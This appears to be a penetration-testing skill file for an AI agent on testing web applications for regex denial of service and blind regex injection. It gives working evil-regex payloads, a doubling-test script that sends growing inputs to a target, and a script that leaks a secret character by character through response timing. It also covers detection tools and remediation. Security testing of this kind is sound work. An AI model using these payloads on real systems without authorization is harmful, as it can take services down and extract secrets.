---
name: testing-for-regex-dos-redos
description: Testing web applications for Regular Expression Denial of Service (ReDoS), where crafted input forces a
  backtracking regex engine into super-linear (polynomial or exponential) processing time, hanging worker threads and
  causing denial of service. Also covers blind regex injection for char-by-char secret exfiltration when the attacker
  controls the pattern. Activates when input is matched against complex validators or when stored regex rules are
  attacker-influenced.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- redos
- denial-of-service
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Testing for Regex Denial of Service (ReDoS)

## When to Use

- During authorized assessments of endpoints that validate input with regexes (email, URL, username, phone, "sanitizers")
- When the application reflects processing time or has visible per-request latency you can measure
- When stored rules, search patterns, or filters let an attacker supply or influence the regex itself (blind regex injection)
- When reviewing source/config and you can read the actual patterns in use
- When testing JS (browser/Node `RegExp`), Python `re`, Java `java.util.regex`, or PCRE — all backtracking engines

## Prerequisites

- **Authorization**: ReDoS is a DoS technique; confirm the scope explicitly allows latency/availability testing, ideally against staging
- **Measurement tooling**: `curl -w`, Burp Suite timing, or a small script that doubles input length and records latency
- **regexploit**: `pip install regexploit` to detect vulnerable patterns and auto-generate evil input
- **Care**: Use bounded input sizes; an exponential payload can take a node down. Coordinate with the client.

## Critical: Variants Most Often Missed

The classic miss is testing one payload length and concluding "no ReDoS".
Catastrophic backtracking only reveals itself as input GROWS, so you must
test doubling lengths and watch for super-linear growth.

Evil regex shapes (nested/overlapping quantifiers and alternation) that
HackTricks/OWASP flag as vulnerable:

```text
(a+)+
([a-zA-Z]+)*
(a|aa)+
(a|a?)+
(.*a){x}   for x > 10
```

All of the above hang on the input `aaaaaaaaaaaaaaaaaaaaaaaa!`.

Catastrophic input shape:

```text
[optional prefix that enters the vulnerable subpattern]
+ long run of an ambiguous char (many 'a', '_', or spaces)
+ a final char that forces overall FAILURE so the engine backtracks
  through every possibility (e.g. '!')
```

Minimal payloads to fire against attacker-controlled regex + input:

```javascript
// Each is super-linear against "aaaaaaaaaaaaaaaaaaaaaaaaaa!"
"(a|a?)+$"        // ~5000 ms
"(\\w*)+$"        // generic, ~3200 ms
"(a*)+$"          // ~3300 ms
"(.*a){100}$"     // ~1400 ms
"([a-zA-Z]+)*$"   // generic, ~770 ms
"(a+)*$"          // ~720 ms
// Eternal (avoid in prod): "((a+)+)+$", "(a?){100}$"
```

Blind regex injection — exfiltrate a secret/flag char-by-char by making the
page freeze ONLY when the pattern matches:

```text
^(?=<known_prefix>)((.*)*)*salt$        # PortSwigger blind regex injection
<known_prefix>(((((((.*)*)*)*)*)*)*)!   # nested-group amplifier
^(?=<prefix>).*.*.*.*.*.*.*.*!!!!$       # alternative amplifier
# Example probing one char: ^(?=HTB{sOmE_fl)((.*)*)*salt$  -> slow == correct guess
```

### How to CONFIRM a hit (avoid false negatives)

Confirm with TIMING evidence, not status codes:

- **Doubling test**: send input of length 2^k for k = 8..15. Plot latency. **Exponential or steep polynomial growth = viable ReDoS.** Linear growth = safe-ish.
- A single long input that jumps from ~10 ms to multiple seconds (or a gateway/worker timeout, e.g. 502/504) is a strong signal.
- For **blind regex injection**: a reproducible latency delta between a matching guess and a non-matching guess (matching = slow) confirms a usable oracle; iterate to leak the secret char-by-char.
- Rule out network jitter: repeat each measurement 3-5x and compare medians; keep a known-fast baseline request alongside.
- If the engine is **RE2 / RE2J / RE2JS / Rust regex** (linear-time, no backtracking), expect NO super-linear growth — pivot to other bottlenecks (huge patterns, input size limits) instead.

## Workflow

### Step 1: Identify Regex-Backed Inputs

```bash
# Likely validators: email, url, username, slug, phone, "sanitize", search filters
# In source review, grep for compiled patterns:
grep -rEn "new RegExp|re\.compile|Pattern\.compile|preg_match|\.match\(|\.test\(" .
```

### Step 2: Establish a Latency Baseline

```bash
curl -s -o /dev/null -w "len=10 %{time_total}s\n" \
  --data-urlencode "email=$(python3 -c 'print("a"*10)')" \
  https://target.example.com/validate
```

### Step 3: Run the Doubling Test (input-only control)

```python
import requests, time
url = "https://target.example.com/validate"
for k in range(8, 16):
    n = 2**k
    payload = "a"*n + "!"          # long ambiguous run + failing tail
    t0 = time.time()
    requests.post(url, data={"email": payload}, timeout=30)
    print(n, f"{time.time()-t0:.3f}s")
# Super-linear growth in the latency column => ReDoS
```

Local confirmation that a known pattern is exponential:

```python
import re, time
pat = re.compile(r'(\w*_)\w*$')
for n in [2**k for k in range(8, 15)]:
    s = 'v' + '_'*n + '!'
    t0 = time.time(); pat.search(s); print(n, f"{time.time()-t0:.3f}s")
```

### Step 4: Auto-Detect Vulnerable Patterns

```bash
# Analyze a single pattern interactively
regexploit

# Scan a codebase and auto-generate evil inputs
regexploit-py path/to/python/src/
regexploit-js path/to/js/src/

# Alternative checkers
# https://devina.io/redos-checker  (web)
# redos-detector (CLI/JS), vuln-regex-detector (end-to-end pipeline)
```

### Step 5: Blind Regex Injection (attacker controls the pattern)

```python
import requests, time, string
host = "https://target.example.com/search"
known = "HTB{"
charset = string.ascii_letters + string.digits + "_}"
while not known.endswith("}"):
    for c in charset:
        guess = known + c
        pattern = f"^(?={guess})((.*)*)*salt$"   # slow only if guess is a real prefix
        t0 = time.time()
        requests.get(host, params={"re": pattern, "subject": "salt"}, timeout=20)
        if time.time()-t0 > 2.0:                 # latency oracle
            known = guess
            print("leaked:", known)
            break
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Backtracking Engine** | PCRE, Java `java.util.regex`, Python `re`, JS `RegExp` retry overlapping matches, enabling blow-up |
| **Catastrophic Backtracking** | Nested/overlapping quantifiers create exponentially many match paths on crafted input |
| **Evil Regex** | Pattern with grouping + repetition + overlap, e.g. `(a+)+`, `([a-zA-Z]+)*`, `(a|aa)+` |
| **Failing Tail** | A final char that cannot match forces the engine to exhaust all backtracking paths |
| **Doubling Test** | Send 2^k-length inputs and look for super-linear latency growth |
| **Blind Regex Injection** | Attacker controls the pattern; latency reveals whether a secret matches, leaking it char-by-char |
| **Linear-time Engines** | RE2/RE2J/RE2JS and Rust `regex` avoid backtracking and are ReDoS-resilient by construction |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **regexploit (doyensec)** | Detect vulnerable regexes and auto-generate evil inputs (`regexploit-py`, `regexploit-js`) |
| **devina.io/redos-checker** | Web-based ReDoS analyzer for a single pattern |
| **vuln-regex-detector** | Extract regexes from a project, detect vulnerable ones, validate PoCs per language |
| **redos-detector** | CLI/JS library that reasons about backtracking to report pattern safety |
| **Burp Suite** | Repeater/Intruder with response-time columns for measuring latency deltas |
| **curl -w %{time_total}** | Quick per-request latency measurement |

## Common Scenarios

### Scenario 1: Email Validator Hang
A signup endpoint validates email with a regex like `^([a-zA-Z0-9]+)*@...$`. Posting `"a"*40000 + "!"` drives request time from 8 ms to 12 s, tying up a worker thread; repeating it exhausts the worker pool and denies service.

### Scenario 2: Stored Filter Rule ReDoS
An admin "content filter" lets users save regex rules later applied to every request. A user saves `(.*a){100}$`; subsequent traffic containing long `a` runs stalls the matching service for all tenants.

### Scenario 3: Blind Regex Injection Secret Leak
A search feature passes a user-supplied pattern straight into the engine and matches it against a server-side secret. Using `^(?=<guess>)((.*)*)*salt$`, an attacker observes which guesses are slow and reconstructs the secret one character at a time.

## Output Format

```
## ReDoS Finding

**Vulnerability**: Regular Expression Denial of Service (ReDoS)
**Severity**: High (CVSS 7.5)
**Location**: POST /validate (email parameter)
**OWASP Category**: A05:2021 - Security Misconfiguration / Denial of Service

### Reproduction Steps
1. Baseline: email of 10 chars -> 0.008 s
2. Send email = "a"*16384 + "!"
3. Observe response time of 9.4 s (worker thread blocked)
4. Doubling test shows exponential growth: 4096->0.6s, 8192->2.4s, 16384->9.4s

### Timing Evidence
| Input length | Response time |
|--------------|---------------|
| 4096 | 0.61 s |
| 8192 | 2.40 s |
| 16384 | 9.42 s |
| 32768 | timeout (504) |

### Vulnerable Pattern (from source review)
`^([a-zA-Z0-9]+)*@example\.com$`  -- nested quantifier `([...]+)*`

### Impact
A single request blocks a worker; a handful of concurrent requests exhaust the
worker pool and deny service to all users.

### Recommendation
1. Replace backtracking patterns; remove nested/overlapping quantifiers
2. Use a linear-time engine (RE2 / Rust regex) for untrusted input
3. Enforce input length limits before matching
4. Apply per-request regex execution timeouts and run matching off the request thread
5. Never compile user-supplied patterns; if unavoidable, sandbox with a linear-time engine
```
